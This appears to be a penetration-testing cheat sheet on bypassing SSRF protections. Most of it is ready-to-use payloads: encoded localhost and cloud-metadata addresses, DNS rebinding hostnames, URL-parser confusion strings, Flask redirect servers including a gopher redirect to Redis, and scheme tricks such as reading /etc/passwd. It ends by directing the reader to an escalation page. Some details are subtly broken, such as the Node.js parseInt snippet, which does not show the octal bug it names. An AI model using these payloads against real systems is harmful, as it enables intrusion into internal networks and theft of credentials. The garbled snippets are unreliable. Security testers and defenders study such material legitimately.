---
tags:
  - critical
  - server-side
---

# SSRF Bypasses

Bypass SSRF protections via IP encoding, DNS tricks, URL parser confusion, or redirects.

## Quick Bypass Chain

```bash
http://127.1/                    # Shortened IP
http://2130706433/               # Decimal
http://[::1]/                    # IPv6
http://127.0.0.1.nip.io/         # DNS wildcard
http://attacker.com/302-redir    # Redirect to internal
```

---

## IP Address Encoding

### Localhost Variations

```bash
# Standard
http://127.0.0.1/
http://localhost/

# Shortened
http://127.1/
http://127.0.1/
http://0/

# Zero representation
http://0.0.0.0/

# Decimal (127.0.0.1 = 127*256^3 + 0*256^2 + 0*256 + 1)
http://2130706433/

# Octal
http://0177.0.0.1/
http://0177.0000.0000.0001/
http://017700000001/

# Hexadecimal
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/
http://0x7f.0.0.1/

# Mixed encodings
http://0x7f.1/
http://0177.1/
http://127.0.0.01/     # Zero-padded
http://127.000.000.001/
```

### IPv6

```bash
# Standard IPv6 localhost
http://[::1]/
http://[0:0:0:0:0:0:0:1]/

# Shortened
http://[::]/
http://[0::1]/

# IPv4-mapped IPv6
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# Zone identifier (RFC 6874)
http://[fe80::1%25eth0]/
```

### Metadata IP (169.254.169.254)

```bash
# Decimal
http://2852039166/

# Hex
http://0xa9fea9fe/

# IPv6 mapped
http://[::ffff:169.254.169.254]/

# Alternative IPs (same service)
http://[fd00:ec2::254]/        # AWS IPv6
```

### Private Ranges

```bash
# 10.0.0.0/8
http://167772160/     # 10.0.0.0
http://0x0a000001/    # 10.0.0.1

# 192.168.0.0/16
http://3232235520/    # 192.168.0.0
http://0xc0a80001/    # 192.168.0.1

# 172.16.0.0/12
http://2886729728/    # 172.16.0.0
```

---

## DNS-Based Bypasses

### Wildcard DNS Services

```bash
# nip.io
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/
http://internal.127.0.0.1.nip.io/

# sslip.io
http://127-0-0-1.sslip.io/
http://127.0.0.1.sslip.io/

# Custom subdomains pointing to localhost
http://localtest.me/              # → 127.0.0.1
http://bugbounty.dod.network/     # → 127.0.0.2
http://spoofed.interact.sh/  # Configurable
```

### DNS Rebinding

**Concept:** Domain resolves to public IP (passes validation), then resolves to internal IP (request time).

**Services:**
- http://1u.ms/
- http://rbndr.us/
- https://github.com/brannondorsey/whonow

**Attack flow:**
```
1. attacker.com → 8.8.8.8 (validation passes)
2. attacker.com → 127.0.0.1 (actual request)
```

**Payload:**
```bash
# 1u.ms format
http://7f000001.rbndr.us/        # Alternates with public IP

# Custom rebinding service
http://A.178.62.122.208.1time.127.0.0.1.1time.repeat.rebind.network/
```

### CNAME Resolution

```bash
# Your controlled domain with CNAME to internal
attacker.com CNAME → localhost
attacker.com CNAME → 169.254.169.254
```

---

## URL Parser Confusion

### Authority Confusion

```bash
# Using @ symbol
http://evil.com@127.0.0.1/
http://127.0.0.1@evil.com/           # Different parsing
http://user:pass@127.0.0.1/
http://127.0.0.1:80@evil.com/

# Backslash confusion (different in browsers vs libraries)
http://127.0.0.1\@evil.com/
http://evil.com\@127.0.0.1/
```

### URL Encoding

```bash
# Single encoding
http://%31%32%37.%30.%30.%31/
http://%6c%6f%63%61%6c%68%6f%73%74/

# Double encoding
http://%25%33%31%25%33%32%25%33%37.0.0.1/

# Null byte
http://127.0.0.1%00@evil.com/

# Newline/carriage return
http://127.0.0.1%0d%0a@evil.com/
http://127.0.0.1%0a@evil.com/
```

### Fragment & Query Confusion

```bash
# Fragment bypass
http://evil.com#127.0.0.1
http://127.0.0.1#evil.com

# Query confusion
http://evil.com?@127.0.0.1
http://127.0.0.1?@evil.com
```

### Unicode/IDN

```bash
# Fullwidth period (。vs .)
http://127。0。0。1/

# Unicode numerals
http://①②⑦.⓪.⓪.⓪/
http://⑯⑨。②⑤④。⑯⑨｡②⑤④/      # 169.254.169.254

# Homograph attacks
http://lοcalhost/     # Greek 'ο'
http://ⅼocalhost/     # Roman numeral 'ⅼ'
```

### Path Normalization

```bash
# Directory traversal
http://evil.com/../../internal/
http://allowed.com/..%2f..%2finternal/

# Dot segments
http://allowed.com/./internal/
http://allowed.com/foo/../internal/
```

---

## Redirect-Based Bypasses

### HTTP Redirects (302/303/307)

```python
# redirect.py
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/redir')
def redir():
    return redirect('http://127.0.0.1/', code=302)

@app.route('/gopher')
def gopher_redir():
    return redirect('gopher://127.0.0.1:6379/_INFO', code=302)
```

**Key:** 303 redirect converts POST → GET, useful for smuggling methods.

### Protocol Switching via Redirect

```bash
# HTTPS validated → HTTP redirected to internal
https://attacker.com/redir → http://127.0.0.1/
```

### Meta Refresh / JavaScript Redirect

```html
<meta http-equiv="refresh" content="0;url=http://127.0.0.1/">
<script>location='http://127.0.0.1/'</script>
```

### Open Redirect Chaining

```bash
# Use existing open redirect in application
https://target.com/redirect?url=http://169.254.169.254/
https://target.com/oauth/callback?redirect_uri=http://127.0.0.1/
```

### Redirect Loop → Blind SSRF Visibility (2025 Technique)

**Concept:** Exploit server-side HTTP client behavior during infinite redirect loops to make blind SSRF observable. Discovered by [@shubs](https://x.com/infosec_au) - PortSwigger Top 10 2025, #3.

**The Attack:**
1. Set up a URL that triggers an infinite redirect loop pointing back to itself
2. Feed it to a blind SSRF vulnerability
3. Server makes N redirects until it hits the redirect limit
4. **Key insight:** The error message or response behavior leaks info about what happened during the loop

```python
# Setup on your server: infinite redirect loop
from flask import Flask, redirect, request
app = Flask(__name__)

@app.route('/loop')
def loop():
    # Redirect back to itself (infinite loop)
    return redirect(request.url, code=302)
```

```bash
# Feed loop URL to blind SSRF
POST /api/webhook
Content-Type: application/json

{"url": "https://your-server.com/loop"}

# Server follows redirects until limit hit
# Error message may reveal: 
# - Number of redirects followed
# - Last URL tried
# - Internal IPs contacted during chain
```

**Why it works:** HTTP clients often reveal redirect chain info in errors. By controlling the loop start/end, you can probe internal networks:

```python
# Probe variant: redirect to internal IP after N hops
count = 0
@app.route('/probe')
def probe():
    global count
    count += 1
    if count < 5:
        return redirect(f"https://your-server.com/probe", 302)
    else:
        count = 0
        return redirect("http://192.168.1.1/", 302)  # Internal target
```

**Detection signals:**
- Different error messages for "too many redirects" vs "connection refused"
- Response timing differences (probed host exists = longer timeout)
- Callback count on your server reveals how many redirects the client followed

---

## Protocol/Scheme Bypasses

### Case Variations

```bash
HTTP://127.0.0.1/
Http://127.0.0.1/
hTtP://127.0.0.1/
```

### Missing/Malformed Schemes

```bash
//127.0.0.1/           # Protocol-relative
/\/\/127.0.0.1/
127.0.0.1/
:@127.0.0.1/
```

### Alternative Protocols

```bash
gopher://127.0.0.1/
dict://127.0.0.1/
file:///etc/passwd
ftp://127.0.0.1/
```

---

## Library-Specific Bypasses

### Ruby (Resolv.getaddresses bug)

```ruby
# Returns [] on some systems, bypassing blocklists
Resolv.getaddresses("127.1")     # → []
Resolv.getaddresses("0x7f.1")    # → []

# Use Socket.getaddrinfo instead
Socket.getaddrinfo("127.1", nil).sample[3]  # → "127.0.0.1"
```

### Node.js (Octal bug pre-v15.12.0)

```javascript
parseInt(08)    // Returns 8 instead of undefined
parseInt(09)    // Returns 9 instead of undefined
```

### Spring Boot

```http
GET ;@evil.com/url HTTP/1.1
```

### Flask

```http
GET @evil.com/ HTTP/1.1
```

### PHP

```bash
# Wildcards in path
http://127.0.0.1/*@target/
http://127.0.0.1\@target/

# php://filter
php://filter/read=convert.base64-encode/resource=http://127.0.0.1/
```

### curl URL Globbing (WAF bypass)

```bash
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```

---

## Whitelist/Blacklist Bypasses

### Subdomain Allowlist

```bash
# If allowed.com is whitelisted
http://allowed.com.evil.com/
http://allowed.com@127.0.0.1/
http://evil.com/allowed.com/../internal
```

### Trailing Characters

```bash
http://allowed.com./           # Trailing dot
http://allowed.com%00/         # Null byte
http://allowed.com%09/         # Tab
http://allowed.com%20/         # Space
```

---

## Quick Bypass Checklist

- [ ] IP encoding (decimal, octal, hex, mixed)
- [ ] IPv6 variations ([::1], [::ffff:127.0.0.1])
- [ ] Shortened IPs (127.1, 0)
- [ ] DNS wildcards (nip.io, sslip.io)
- [ ] DNS rebinding
- [ ] URL encoding (single, double)
- [ ] @ symbol confusion
- [ ] Backslash variations
- [ ] Redirect chains (302/303/307)
- [ ] Protocol switching
- [ ] Unicode/homograph
- [ ] Case variations (HTTP vs http)
- [ ] Open redirects in application

---

## Tools

| Tool | Purpose |
|------|---------|
| [Burp-Encode-IP](https://github.com/e1abrador/Burp-Encode-IP) | IP encoding variations |
| [recollapse](https://github.com/0xacb/recollapse) | Regex bypass generation |
| [PortSwigger Bypass Cheat Sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) | Interactive generator |

---

Bypass working? Move to [Escalation](escalate.md).
